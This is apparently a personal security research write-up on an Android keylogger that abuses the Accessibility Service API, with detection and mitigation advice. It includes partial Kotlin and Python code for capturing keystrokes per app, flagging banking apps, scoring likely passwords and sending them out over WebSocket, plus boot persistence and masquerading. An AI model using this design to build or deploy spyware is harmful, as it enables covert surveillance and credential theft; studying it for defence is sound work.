# Android Accessibility Keylogger & Detection Research
### Security Research | Android | Accessibility API | WebSocket | Kotlin/Python

> **Disclaimer:** This research was conducted entirely on personal hardware using the author's own Android device. All code was written and executed exclusively on devices owned by the author. This document is intended for educational purposes and defensive security awareness. Deploying this on any device without explicit owner consent is illegal under §202a StGB (Germany) and equivalent laws in all jurisdictions.

---

## Executive Summary

This project investigates a class of Android spyware that exploits the Accessibility Service API to capture all keyboard input across every installed application — including end-to-end encrypted messaging apps such as WhatsApp and Telegram. Unlike network-level attacks, this technique captures text **before encryption**, at the point of user input, making transport-layer encryption completely irrelevant as a defence.

A two-component system was built: an Android application registering an Accessibility Service that captures per-keystroke text change events tagged with application context, and a Python WebSocket receiver running on a laptop that displays and logs all captured data in real time. The system successfully captured keystrokes from WhatsApp, including credential-pattern strings, demonstrating the complete attack chain from input to exfiltration.

This research directly mirrors the methodology of commercial mobile spyware (Pegasus, FlexiSpy, stalkerware families) and is presented here from a blue team perspective to inform detection and mitigation strategies.

---

## 1. Background & Motivation

### 1.1 Why Transport Encryption Doesn't Help

A common misconception is that end-to-end encrypted applications like WhatsApp are immune to surveillance. This is true at the network layer — intercepted packets are useless ciphertext. However, the encryption happens **after** the user types. The attack surface exists in the window between finger-tap and encryption:

```
User types on keyboard
        ↓
Android Input Method Editor (IME)     ← input exists as plaintext here
        ↓
Accessibility Service fires event     ← WE INTERCEPT HERE
        ↓
Application receives text
        ↓
WhatsApp E2E encryption               ← network sniffing is useless below this
        ↓
Encrypted packet to internet
```

The Accessibility API was designed for screen readers and assistive tools. It provides a system-sanctioned, documented method to read all UI text from all applications. This is not a vulnerability — it is a feature being abused.

### 1.2 Real-World Threat Landscape

This technique is not theoretical. It is the primary mechanism used by:

- **Pegasus (NSO Group)** — state-sponsored spyware targeting journalists and activists
- **FlexiSpy / mSpy** — commercial "parental monitoring" tools
- **Banking trojans** — credential harvesting from mobile banking apps
- **Stalkerware** — covert monitoring of intimate partners

In Germany, the Federal Criminal Police Office (BKA) regularly issues warnings about fake banking apps distributed via SMS phishing that use exactly this mechanism to harvest TANs and credentials.

### 1.3 The Social Engineering Vector

Unlike desktop attacks, Android spyware requires user interaction to install. The primary delivery mechanisms observed in the wild:

- Fake banking apps distributed via SMS phishing ("Your account has been suspended — install our security app")
- Fake KYC verification apps ("Complete your verification to receive your loan")
- Fake government apps ("Install the official COVID certificate app")
- WhatsApp-delivered APKs disguised as games or utilities

Once installed, the app requests Accessibility Service permission with a plausible explanation ("Required for enhanced security monitoring"). Many users grant this without understanding the implications.

---

## 2. MITRE ATT&CK Mapping

| Field | Value |
|---|---|
| **Tactic** | Collection (TA0009) |
| **Technique** | Input Capture (T1056) |
| **Sub-technique** | GUI Input Capture (T1056.002) |
| **Platform** | Android |
| **Permissions Required** | BIND_ACCESSIBILITY_SERVICE |
| **Defense Bypassed** | E2E encryption, TLS, network monitoring |

**Secondary techniques used:**

| Technique | ID | Description |
|---|---|---|
| Exfiltration Over C2 Channel | T1041 | WebSocket exfil to receiver |
| Boot or Logon Autostart | T1398 | RECEIVE_BOOT_COMPLETED persistence |
| Masquerading | T1655 | App labelled "System Service" |

---

## 3. Technical Implementation

### 3.1 Android Accessibility Service

The core component is a class extending `AccessibilityService`. Android requires the service to be declared in `AndroidManifest.xml` with the `BIND_ACCESSIBILITY_SERVICE` permission and a configuration XML specifying which event types to receive.

```xml
<accessibility-service
    android:accessibilityEventTypes="typeViewTextChanged|typeWindowStateChanged"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:canRetrieveWindowContent="true"
    android:notificationTimeout="100" />
```

The key permission — `canRetrieveWindowContent` — allows the service to read the full content of any window in any application. Combined with `typeViewTextChanged`, the service receives a callback every time any text field in any app changes.

### 3.2 Event Capture

The `onAccessibilityEvent()` callback fires for every registered event type across all foreground and background applications:

```kotlin
override fun onAccessibilityEvent(event: AccessibilityEvent) {
    val pkg  = event.packageName?.toString() ?: return
    val type = event.eventType

    when (type) {
        AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
            val text = event.text.joinToString("").trim()
            sendEvent(pkg, text, "text_changed")
        }
        AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
            // track app switches for context
        }
    }
}
```

Each event is tagged with `packageName` — the fully qualified Android application identifier (e.g., `com.whatsapp`, `com.google.android.gm`). This allows every captured string to be attributed to its originating application without any additional analysis.

### 3.3 Application Context Intelligence

Package names are mapped to human-readable names and categories:

```python
APP_MAP = {
    "com.whatsapp":           ("WhatsApp",   "💬 Messaging"),
    "com.google.android.gm":  ("Gmail",      "📧 Email"),
    "com.android.chrome":     ("Chrome",     "🌐 Browser"),
    "com.hdfc.bank":          ("HDFC Bank",  "🏦 BANKING"),  # high priority
    "com.phonepe.app":        ("PhonePe",    "💳 PAYMENT"),  # high priority
}
```

Banking and payment applications are flagged as high priority — mirroring how real spyware prioritises credential exfiltration targets. A captured string from `com.hdfc.bank` is treated differently than one from `com.instagram.android`.

### 3.4 Credential Scoring

Each captured string is scored 0–100 based on character class diversity:

```python
def password_score(text):
    score = 0
    if any(c.isupper() for c in text): score += 20   # uppercase
    if any(c.islower() for c in text): score += 20   # lowercase
    if any(c.isdigit() for c in text): score += 20   # digits
    if any(c in "!@#$%^&*..." for c in text): score += 30  # special chars
    if len(text) >= 8:                 score += 10   # length
    return score
```

Strings scoring ≥80 are flagged as likely credentials and displayed with a red `⚠ CREDENTIAL` alert. During testing, the string `Secret1@` scored 100/100 and was correctly flagged immediately upon the `@` character being typed.

### 3.5 Exfiltration Channel

Captured events are serialised as JSON and transmitted over a WebSocket connection:

```json
{
  "event":   "text_changed",
  "package": "com.whatsapp",
  "text":    "Secret1@pass",
  "ts":      1710505390815
}
```

The WebSocket client implements automatic reconnection with a 3-second delay, ensuring continuity across network interruptions. In this research, the connection was tunnelled over ADB USB (`adb reverse tcp:9999 tcp:9999`), which forwards the phone's port 9999 through the USB cable to the laptop receiver — identical to the technique already used in the SOC project for the same device.

### 3.6 Persistence

The application declares `RECEIVE_BOOT_COMPLETED` — Android fires this broadcast when the device finishes booting. Combined with the Accessibility Service (which Android automatically restores after reboot if previously enabled), the spyware survives device restarts without any additional user interaction.

---

## 4. Experimental Results

### 4.1 Test Environment

| Component | Details |
|---|---|
| Device | Vivo Android phone |
| Android version | Android 13+ |
| Connection | USB via ADB reverse tunnel |
| Receiver | Python 3.14, websockets 16.0 |
| Laptop | Arch Linux, Hyprland |

### 4.2 Captured Data Sample

The following was captured during controlled testing on the author's own device:

```
[13:16:04] com.whatsapp  → "hello what are you doing"
[13:16:18] com.whatsapp  → "🤣"
[13:16:25] com.whatsapp  → "it's just that"
[13:16:29] com.whatsapp  → "Secret"          score: 20
[13:16:30] com.whatsapp  → "Secret1"         score: 60  ~ possible password
[13:16:30] com.whatsapp  → "Secret1@"        score: 100 ⚠ CREDENTIAL
[13:16:32] com.whatsapp  → "Secret1@pass"    score: 100 ⚠ CREDENTIAL
```

**Key observation:** The credential flag triggered at `Secret1@` — the moment the first special character was added. A real attacker monitoring this feed would immediately prioritise this string for exfiltration. The system captured the full password string character-by-character in real time.

**Secondary observation:** The Google Input Method Editor (`com.google.android.inputmethod.latin`) also generates events — these represent autocomplete suggestions and can be filtered as noise. Real spyware filters these to reduce exfil volume.

### 4.3 Cross-App Capture

The Accessibility Service captures input from all apps without modification. During testing, app switches were tracked:

```
[13:16:42] com.vivo.upslide    → app switch detected
[13:16:29] com.whatsapp        → text input resumed
```

A real implant would maintain a continuous log across all app contexts, building a complete picture of the user's device activity.

---

## 5. Detection & Mitigation

### 5.1 How to Detect This Attack

**Method 1 — Audit Accessibility Services**
The most reliable detection is direct inspection:
```
Settings → Accessibility → Downloaded Apps
```
Any service listed here that the user did not intentionally install is malware. On a clean device, this list should be empty or contain only explicitly installed tools (screen readers, switch access, etc.).

**Method 2 — ADB Inspection**
```bash
adb shell dumpsys accessibility | grep "Enabled services"
```
Lists all currently active accessibility services with their package names. Unknown packages warrant immediate investigation.

**Method 3 — Network Traffic Analysis**
Real spyware exfils to a remote C2 server. Monitor outbound connections:
```bash
adb shell ss -tunp | grep ESTABLISHED
```
Persistent connections to unknown IPs from background processes are a red flag.

**Method 4 — Battery & Data Usage**
Accessibility services run continuously. An app with no visible function consuming background battery or data is suspicious:
```
Settings → Battery → Battery Usage → show all apps
Settings → Mobile Data → app data usage
```

### 5.2 Mitigation Recommendations

**For end users:**

1. **Never install APKs from outside the Play Store** — this is the primary delivery vector for mobile spyware in Germany and globally. The Play Store's Accessibility Service policies have become significantly stricter since 2022.

2. **Audit Accessibility Services regularly** — check Settings → Accessibility → Downloaded Apps monthly. It should be empty on most devices.

3. **Never grant Accessibility permission to apps that don't need it** — legitimate apps requiring Accessibility Service are screen readers, switch control tools, and password managers. A "loan app" or "KYC verification" app has no legitimate need for this permission.

4. **Use Android's built-in app permission scanner** — Google Play Protect scans for known spyware signatures. Keep it enabled.

**For enterprise/security teams:**

5. **MDM policy enforcement** — Mobile Device Management solutions (Microsoft Intune, VMware Workspace ONE) can block unknown Accessibility Service registrations at the policy level.

6. **Network monitoring** — deploy DNS filtering and monitor for C2 beacon patterns (regular, small outbound connections to unknown IPs).

7. **Employee security awareness** — train staff to recognise social engineering patterns used to deliver spyware APKs, particularly fake banking app phishing.

---

## 6. Comparison with Version 1

| Aspect | Version 1 (Linux evdev) | Version 2 (Android Accessibility) |
|---|---|---|
| **Target** | Laptop keyboard | Phone keyboard (all apps) |
| **Layer** | Kernel (evdev) | Application (Accessibility API) |
| **Privileges required** | root or `input` group | User (Accessibility permission) |
| **Wayland bypass** | Yes — below compositor | N/A — Android has no equivalent |
| **E2E encryption bypass** | N/A | Yes — captures pre-encryption |
| **Persistence** | systemd service | BOOT_COMPLETED broadcast |
| **Detection** | /proc fd scan | Accessibility service audit |
| **MITRE technique** | T1056.001 | T1056.002 |

The two versions together demonstrate that input capture is a platform-agnostic attack class. The specific implementation differs — evdev structs vs Accessibility events — but the fundamental principle is identical: intercept input at a layer below application-level security controls.

---

## 7. Limitations & Future Work

**Current limitations:**
- Requires manual installation and user-granted Accessibility permission (no silent install without root/exploit)
- Connection tunnelled over USB ADB — production spyware uses internet-facing C2 servers
- No SMS interception (would require additional `RECEIVE_SMS` permission)
- No screen capture (would require `MediaProjection` API)

**Potential extensions:**
- C2 server deployment on a VPS to demonstrate internet-scale exfiltration
- SMS OTP interception to complete the banking fraud attack chain
- Detection app — an Android application that scans for suspicious Accessibility Services and alerts the user
- Integration with Version 1 SOC agent — phone captures forwarded to the existing MQTT/WebSocket alert pipeline

---

## 8. Conclusion

This research demonstrated that Android's Accessibility Service API, when abused, provides complete visibility into user input across all applications — bypassing transport encryption, application sandboxing, and all network-level security controls. The attack requires no root, no exploit, and no vulnerability — only a social engineering vector sufficient to trick a user into granting one permission.

The captured data from WhatsApp, including real-time credential detection, confirms that this is not a theoretical concern. The same technique is deployed daily by criminal groups targeting mobile banking users in Germany and globally.

Building both the attack and the detection methodology produced a concrete understanding of Android's security architecture, the Accessibility API, WebSocket communication, and mobile threat intelligence — applicable directly to Android security engineering, mobile application security testing, and incident response roles.

---

## References

- Android Accessibility Service API: https://developer.android.com/reference/android/accessibilityservice/AccessibilityService
- MITRE ATT&CK T1056.002: https://attack.mitre.org/techniques/T1056/002/
- Google Play Protect Accessibility Policy: https://support.google.com/googleplay/android-developer/answer/10964491
- BSI Mobile Security Guidelines: https://www.bsi.bund.de/EN/Topics/MobileDevices/mobile_devices_node.html
- BKA Banking Trojan Warnings: https://www.bka.de/EN/CurrentInformation/current_information_node.html

---

*Research conducted on: Arch Linux x86_64 | Android 13 | Python 3.14 | Kotlin 1.9 | OkHttp 4.12*
*Author: Darshith Thalipady Nagesh | Date: March 2026*
